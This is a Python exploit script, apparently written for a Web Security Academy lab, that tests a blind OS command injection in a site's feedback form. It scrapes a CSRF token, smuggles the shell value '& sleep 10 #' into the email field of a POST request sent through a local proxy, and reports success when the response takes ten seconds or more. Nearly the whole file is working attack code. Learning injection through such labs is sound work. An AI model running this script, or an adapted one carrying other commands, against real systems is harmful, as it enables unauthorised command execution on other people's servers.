import requests
import urllib3,argparse,sys
from pyfiglet import figlet_format,FigletFont
from colorama import init
from random import randrange
from termcolor import colored
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# Initialize colorama for Windows support
init(autoreset=True)

# taking the url from the user
def parse_args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest = "url",
                        help = "your target ex : https://0a3000ad04bcc1d581618e43005400ad.web-security-academy.net/",
                        default = "https://0a250068031450d5835cdc2a002b0069.web-security-academy.net",
                        required = True)
    parser.add_argument('-session','--session',
                        dest = "session",
                        help = "your session",
                        required = True)
    return parser.parse_args()

# banner
def banner():
    list=FigletFont.getFonts()
    print(figlet_format("OS", font=list[randrange(len(list) - 1)]))
    print(colored("Build a Simple OS Command injection  Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def get_csrf_token(url,cookie):
    URL=url+'/feedback'
    try:
        r = requests.get(url=URL,verify=False,cookies=cookie)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {"name": "csrf"})['value']
        return csrf
    except Exception as e:
        print(colored(e,'red'))
        sys.exit(0)

def os_injection_command(url,command,csrf,cookies):
    path='/feedback/submit'
    data={'csrf':csrf,'name':'test','email':'test@g.c'+command,'subject':'test','message':'test'}
    header={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://0aa1002d0410fb08807d9ea100420043.web-security-academy.net',
    'Referer': 'https://0aa1002d0410fb08807d9ea100420043.web-security-academy.net/feedback',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Te': 'trailers',
    }
    try:
        r=requests.post(url=url+path,data=data,verify=False,proxies=proxies,timeout=15,headers=header,cookies=cookies)

        elapsed_time = r.elapsed.total_seconds()
        if elapsed_time >=10:
            print(colored(f'injection successful','green'))
        else:
            print(colored('injection unsuccessful','red'))
    
    except Exception as e:
        print(colored(e,'yellow'))
        sys.exit(0)
    
def main():
    banner()

    url=parse_args().url
    cookies=parse_args().session
    URL=str(url).rstrip('/')
    Cookie= {'session':cookies}
    csrf=get_csrf_token(URL,Cookie)
   
    command='& sleep 10 #' 
    print(colored('Exploiting the command injection ...','blue'))
    os_injection_command(URL,command,csrf,Cookie)
    


if __name__=='__main__':
    main()